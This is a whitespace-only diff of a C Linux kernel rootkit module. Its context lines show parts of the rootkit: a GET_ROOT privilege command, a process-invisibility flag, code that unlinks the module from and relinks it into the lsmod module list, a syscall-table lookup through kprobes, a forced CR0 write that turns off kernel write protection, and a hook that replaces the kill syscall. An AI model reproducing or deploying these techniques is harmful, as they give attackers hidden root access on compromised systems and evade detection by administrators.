@@ -1,24 +1,24 @@
 /*
  *	demonstrating that ~ Kernel is life
  */
-#include <linux/init.h>		
-#include <linux/module.h>	
-#include <linux/kernel.h>	
-#include <linux/list.h>		
-#include <linux/cred.h>		
-#include <linux/fs.h>           
-#include <linux/cdev.h>         
-#include <linux/uaccess.h>      
-#include <linux/ioctl.h>        
-#include <linux/syscalls.h>     
-#include <linux/slab.h>         
-#include <linux/sched.h>        
-#include <linux/fdtable.h>      
-#include <linux/proc_ns.h>	
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/list.h>
+#include <linux/cred.h>
+#include <linux/fs.h>
+#include <linux/cdev.h>
+#include <linux/uaccess.h>
+#include <linux/ioctl.h>
+#include <linux/syscalls.h>
+#include <linux/slab.h>
+#include <linux/sched.h>
+#include <linux/fdtable.h>
+#include <linux/proc_ns.h>
 #include <linux/kprobes.h>
 #include <linux/dirent.h>
-#include <asm/ptrace.h>		
-		
+#include <asm/ptrace.h>
+
 #define PF_INVISIBLE 0x10000000
 
 #define GET_ROOT 64
@@ -78,7 +78,7 @@ static void show_rootkit(void)
 	printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ revealing to `lsmod` cmd, in `/proc/modules` file path and `/proc/kallsyms` file path \n");
 
 	list_add(&THIS_MODULE->list, prev_module_in_proc_modules_lsmod);
-	
+
 	is_hidden_proc = 0;
 }
 
@@ -111,7 +111,7 @@ unsigned long *get_syscall_table(void)
 	unsigned long *syscall_table;
 
 	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
-	
+
 	kallsyms_lookup_name_t kallsyms_lookup_name;
 	register_kprobe(&kp);
 	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
@@ -126,7 +126,7 @@ unsigned long *get_syscall_table(void)
 static inline void write_cr0_forced(unsigned long val)
 {
 	unsigned long __force_order;
-	
+
 	asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
 }
 
@@ -322,7 +322,7 @@ static int __init rootkit_init(void)
 	__sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
 
 	protect_memory();
-	
+
         return 0;
 }
 
